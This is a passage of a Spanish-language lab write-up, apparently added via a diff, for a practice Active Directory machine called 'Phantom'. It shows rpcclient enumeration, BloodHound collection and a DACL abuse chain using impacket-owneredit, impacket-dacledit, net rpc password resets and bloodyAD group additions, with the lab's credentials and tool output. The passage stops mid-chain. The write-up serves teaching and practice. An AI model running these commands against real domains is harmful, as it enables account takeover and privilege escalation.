+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>joe<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x451<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>mia<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x452<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>sandra<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x453<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>maria<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x454<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>ana<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x455<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>michael<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x456<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>ian<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x457<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>joshua<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x458<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>frank<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x459<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>tomas<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45b<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>robert<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45c<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>LegacyAdmins<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Bien, no cambia a cuando lo hicimos con el <strong>servicio SMB</strong>.</p>
+<p>Enumeremos las descripciones de cada usuario con <code>querydispinfo</code>, esto para ver si aparece algún dato de cualquier usuario que nos sea de ayuda:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient $&gt; querydispinfo
+</span></span><span style="display:flex;"><span>index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: Cuenta integrada para la administración del equipo o dominio
+</span></span><span style="display:flex;"><span>index: 0xfb7 RID: 0x455 acb: 0x00000210 Account: ana	Name: Ana	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfb2 RID: 0x450 acb: 0x00000210 Account: bob	Name: Bob	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfbb RID: 0x459 acb: 0x00000210 Account: frank	Name: Frank	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: ian	Name: Ian	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Invitado	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: Cuenta integrada para el acceso como invitado al equipo o dominio
+</span></span><span style="display:flex;"><span>index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: joe	Name: Joe	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfba RID: 0x458 acb: 0x00000210 Account: joshua	Name: Joshua	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: Cuenta de servicio de centro de distribución de claves
+</span></span><span style="display:flex;"><span>index: 0xfc6 RID: 0x464 acb: 0x00000210 Account: LegacyAdmins	Name: LegacyAdmins	Desc: Legacy administrative group maintained <span style="color:#66d9ef">for</span> backward compatibility with older systems.
+</span></span><span style="display:flex;"><span>index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: maria	Name: Maria	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfb1 RID: 0x44f acb: 0x00000210 Account: mark	Name: Mark	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: mia	Name: Mia	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfb8 RID: 0x456 acb: 0x00000210 Account: michael	Name: Michael	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfbe RID: 0x45c acb: 0x00000210 Account: robert	Name: Robert	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: sandra	Name: Sandra	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfbd RID: 0x45b acb: 0x00000210 Account: tomas	Name: Tomas	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>No hay nada que destacar.</p>
+<p>Enumeremos los grupos existentes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient $&gt; enumdomgroups
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Enterprise Domain Controllers de sólo lectura<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Admins. del dominio<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x200<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Usuarios del dominio<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x201<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Invitados del dominio<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x202<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Equipos del dominio<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x203<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Controladores de dominio<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x204<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Administradores de esquema<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x206<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Administradores de empresas<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x207<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Propietarios del creador de directivas de grupo<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x208<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Controladores de dominio de sólo lectura<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x209<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Controladores de dominio clonables<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x20a<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Protected Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x20d<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Administradores clave<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x20e<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Administradores clave de la organización<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x20f<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>DnsUpdateProxy<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44e<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>IT<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45d<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Support<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45e<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>RRHH<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45f<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Finances<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x460<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Developers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x461<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>HelpDesk<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x462<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>DevOps<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>group:<span style="color:#f92672">[</span>Monitoring<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Hay algunos grupos que se ven interesantes, por ejemplo, los grupos <strong>IT, Developers, DevOps, Monitoring y Support</strong>, así que quizá esto nos ayuda después.</p>
+<p>Por último, te muestro el siguiente oneliner que nos ayuda a obtener todos los usuarios existentes con <strong>rpcclient</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#39;mark%suP3rPa$sw0rd2026!&amp;&#39;</span> 192.168.56.100 -c <span style="color:#e6db74">&#34;enumdomusers&#34;</span> | awk -F <span style="color:#e6db74">&#39;[][]&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span>
+</span></span><span style="display:flex;"><span>Administrador
+</span></span><span style="display:flex;"><span>Invitado
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>mark
+</span></span><span style="display:flex;"><span>bob
+</span></span><span style="display:flex;"><span>joe
+</span></span><span style="display:flex;"><span>mia
+</span></span><span style="display:flex;"><span>sandra
+</span></span><span style="display:flex;"><span>maria
+</span></span><span style="display:flex;"><span>ana
+</span></span><span style="display:flex;"><span>michael
+</span></span><span style="display:flex;"><span>ian
+</span></span><span style="display:flex;"><span>joshua
+</span></span><span style="display:flex;"><span>frank
+</span></span><span style="display:flex;"><span>tomas
+</span></span><span style="display:flex;"><span>robert
+</span></span><span style="display:flex;"><span>LegacyAdmins
+</span></span></code></pre></div><p>Ya solo guárdalos en un archivo o solo agrega que la salida se guarde en un archivo.</p>
+<h3 id="BloodHound">Enumeración de AD con BloodHound-Python y BloodHound Ver 4.3.1</h3>
+<p>Al no encontrar algo más, vamos a analizar la infraestructura del AD para identificar si nuestro usuario tiene algún privilegio/permiso que nos permita ganar acceso a la máquina víctima.</p>
+<p>Para esto, utilizaremos la herramienta <strong>bloodhound-python</strong> para poder capturar toda esta información:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u <span style="color:#e6db74">&#39;mark&#39;</span> -p <span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span> -d PHANTOM.THL -dc DC01.PHANTOM.THL -ns 192.168.56.100 --zip -c all
+</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: phantom.thl
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">18</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">60</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 01S
+</span></span><span style="display:flex;"><span>INFO: Compressing output into 20260427220657_bloodhound.zip
+</span></span></code></pre></div><p>Carga ese <strong>archivo ZIP</strong> a <strong>BloodHound</strong> y busquemos la información del <strong>usuario mark</strong>.</p>
+<p><strong>Nota</strong>: Puede que la herramienta llegue a fallar si es que no tienes configurado un <strong>DNS</strong> de la máquina víctima, por lo que puedes hacer lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano /etc/resolv.conf
+</span></span><span style="display:flex;"><span>----
+</span></span><span style="display:flex;"><span>nameserver IP_Máquina_AD 
+</span></span></code></pre></div><p>Ahora sí, continuemos.</p>
+<p>Observa que tenemos la siguiente cadena de ataques al seleccionar la opción <strong>Reachable High Value Targets</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-phantom/Captura1.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-phantom/Captura2.png">
+</p>
+<p>Con lo que podemos ver, podemos realizar una cadena de ataques que nos llevara hasta el <strong>usuario frank</strong>, que es quien se puede conectar a la máquina víctima vía <strong>WinRM</strong> junto a otros 2 usuarios más.</p>
+<p>Apliquemos los ataques.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="AttackChain">Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima - Abuso de AD-DACL</h3>
+<p>La idea es aplicar la siguiente cadena de ataques:</p>
+<ul>
+<li>Abusar del permiso <code>WriteOwner</code> que tenemos hacia el <strong>usuario bob</strong> para cambiar su contraseña.</li>
+<li>Abusar del permiso <code>AddSelf</code> que tiene el <strong>usuario bob</strong> sobre el grupo <strong>IT</strong>, para agregarlo a este mismo grupo.</li>
+<li>Abusar del permiso <code>WriteDacl</code> que tienen los usuarios del grupo <strong>IT</strong> para agregar al <strong>usuario bob</strong> al grupo <strong>HELPDESK</strong>.</li>
+<li>Abusar del permiso <code>ForceChangePassword</code> que tienen los usuarios del grupo <strong>HELPDESK</strong>, en este caso el <strong>usuario bob</strong>, para cambiarle la contraseña del <strong>usuario frank</strong>.</li>
+<li>Utilizar al <strong>usuario frank</strong> para ganar acceso a la máquina víctima vía <strong>WinRM</strong> usando <strong>Evil-WinRM</strong>, ya que tiene el permiso <code>CanPSRemote</code>.</li>
+</ul>
+<p>Todo esto lo aplicaremos a continuación.</p>
+<h4 id="WriteOwner">Abusando del Permiso WriteOwner para Cambiar Contraseña de Usuario bob</h4>
+<p>Primero entendamos, ¿qué hace el permiso <code>WriteOwner</code>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Permiso WriteOwner</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El permiso WriteOwner en Active Directory (AD) es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) modificar el propietario (owner) de un objeto dentro del directorio. Este objeto puede ser, entre otros, un usuario, grupo, equipo, unidad organizativa (OU), política de grupo (GPO) o plantilla de certificado.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora entendamos qué podemos hacer con este permiso:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Abuso del Permiso WriteOwner</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Permite a los atacantes cambiar la propiedad de los objetos del directorio. Concretamente, al abusar del permiso WriteOwner en las listas de control de acceso discrecional (DACL), los adversarios pueden hacerse con el control de objetos sensibles y escalar privilegios dentro del dominio. En resume, el permiso WriteOwner te permite cambiar el propietario de ese objeto a cualquier usuario, permitiendo acciones como el cambio de contraseña de un usuario.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí te dejo un blog que explica cómo abusar de este permiso; checa la sección <strong>Exploitation Phase I</strong>:</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteOwner</a></li>
+</ul>
+<p>Utilizaremos la herramienta <strong>impacket-owneredit</strong> para hacer que el <strong>usuario mark</strong> sea nuevo propietario del <strong>usuario bob</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#e6db74">&#39;mark&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN=bob,CN=Users,DC=PHANTOM,DC=THL&#39;</span> <span style="color:#e6db74">&#39;PHANTOM.THL&#39;</span>/<span style="color:#e6db74">&#39;mark&#39;</span>:<span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span> -dc-ip 192.168.56.100
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current owner information below
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> - SID: S-1-5-21-3580157585-956322742-780763674-512
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> - sAMAccountName: Admins. del dominio
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> - distinguishedName: CN<span style="color:#f92672">=</span>Admins. del dominio,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>PHANTOM,DC<span style="color:#f92672">=</span>THL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OwnerSid modified successfully!
+</span></span></code></pre></div><p>Funcionó, modificamos la <strong>DACL</strong> del <strong>objeto de usuario bob</strong>.</p>
+<p>Ahora, usemos la herramienta <strong>impacket-dacledit</strong> para hacer que el <strong>usuario mark</strong> tenga el <strong>Control Total (Full Control)</strong> del <strong>usuario bob</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;FullControl&#39;</span> -principal <span style="color:#e6db74">&#39;mark&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN=bob,CN=Users,DC=PHANTOM,DC=THL&#39;</span> <span style="color:#e6db74">&#39;PHANTOM.THL&#39;</span>/<span style="color:#e6db74">&#39;mark&#39;</span>:<span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span> -dc-ip 192.168.56.100
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL backed up to dacledit-20260427-222659.bak
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL modified successfully!
+</span></span></code></pre></div><p>Se modificó correctamente.</p>
+<p>Cambiemos la contraseña del <strong>usuario bob</strong> con la herramienta <strong>net</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password bob <span style="color:#e6db74">&#39;SuperP@ass123&#39;</span> -U PHANTOM.THL/mark%<span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span> -S 192.168.56.100
+</span></span></code></pre></div><p>Comprobemos si funcionó el cambio con <strong>netexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100 -u <span style="color:#e6db74">&#39;bob&#39;</span> -p <span style="color:#e6db74">&#39;SuperP@ass123&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\b</span>ob:SuperP@ass123
+</span></span></code></pre></div><p>Muy bien, funcionó correctamente.</p>
+<h4 id="AddSelf">Abusando del Permiso AddSelf para Agregar al Usuario bob al Grupo IT</h4>
+<p>Primero entendamos, ¿qué hace el permiso <code>AddSelf</code>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Permiso AddSelf</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El permiso AddSelf en Active Directory (AD), también conocido como Self-Membership, es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) agregarse a sí mismo como miembro de un grupo específico. Este permiso se aplica comúnmente sobre objetos de tipo grupo y está diseñado para permitir escenarios controlados donde los usuarios pueden autogestionar su pertenencia a determinados grupos.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora entendamos qué podemos hacer con este permiso:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Abusando del Permiso AddSelf</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Al aprovechar el permiso «AddSelf», los atacantes pueden escalar privilegios añadiéndose a sí mismos a grupos con privilegios, como «Domain Admins» u «Backup Operators». Como resultado, obtienen control administrativo, se desplazan lateralmente por la red, acceden a sistemas confidenciales y mantienen su presencia en el sistema.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí te dejo un blog que explica como abusar de este servicio; checa la sección <strong>Exploitation Phase I</strong>:</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/addself-active-directory-abuse/" target="_blank">Hacking Articles - Abusing AD-DACL: AddSelf</a></li>
+</ul>
+<p>Usaremos la herramienta <strong>bloodyAD</strong> para asignar al <strong>usuario bob</strong> al grupo <strong>IT</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#34;192.168.56.100&#34;</span> -d <span style="color:#e6db74">&#34;PHANTOM.THL&#34;</span> -u <span style="color:#e6db74">&#34;bob&#34;</span> -p <span style="color:#e6db74">&#34;SuperP@ass123&#34;</span> add groupMember <span style="color:#e6db74">&#34;IT&#34;</span> <span style="color:#e6db74">&#34;bob&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bob added to IT
+</span></span></code></pre></div><p>Podemos comprobar que este usuario ya pertenece al grupo <strong>IT</strong> con la herramienta <strong>net</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc group members <span style="color:#e6db74">&#34;IT&#34;</span> -U PHANTOM.THL/bob%<span style="color:#e6db74">&#39;SuperP@ass123&#39;</span> -S 192.168.56.100
+</span></span><span style="display:flex;"><span>PHANTOM<span style="color:#ae81ff">\b</span>ob
+</span></span></code></pre></div><h4 id="WriteDacl">Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK</h4>
+<p>Primero entendamos, ¿qué hace el permiso <code>WriteDacl</code>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Permiso WriteDacl</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El permiso WriteDACL (Write Discretionary Access Control List) en Active Directory (AD) es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) modificar la lista de control de acceso discrecional (DACL) de un objeto. La DACL es el componente encargado de definir qué entidades tienen permisos sobre un objeto y qué acciones pueden realizar sobre él.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora entendamos qué podemos hacer con este permiso:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Abusando del Permiso WriteDacl</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Los atacantes pueden hacer un uso indebido de los permisos WriteDacl para obtener acceso no autorizado o modificar los permisos existentes con el fin de alcanzar sus objetivos. Por ejemplo, podemos modificar los permisos de un grupo para que permita asignar a cualquier usuario, cuando no debería hacerlo.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí te dejo un blog que explica como abusar de este servicio; checa la sección <strong>Exploitation Phase II</strong>:</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteDacl</a></li>
+</ul>
+<p>Utilizaremos la herramienta <strong>impacket-dacledit</strong> para hacer que el <strong>usuario bob</strong> tenga <strong>Control Total (Full Control)</strong> del grupo <strong>HELPDESK</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;WriteMembers&#39;</span> -principal <span style="color:#e6db74">&#39;bob&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN=HELPDESK,CN=Users,DC=PHANTOM,DC=THL&#39;</span> <span style="color:#e6db74">&#39;PHANTOM.THL&#39;</span>/<span style="color:#e6db74">&#39;bob&#39;</span>:<span style="color:#e6db74">&#39;SuperP@ass123&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
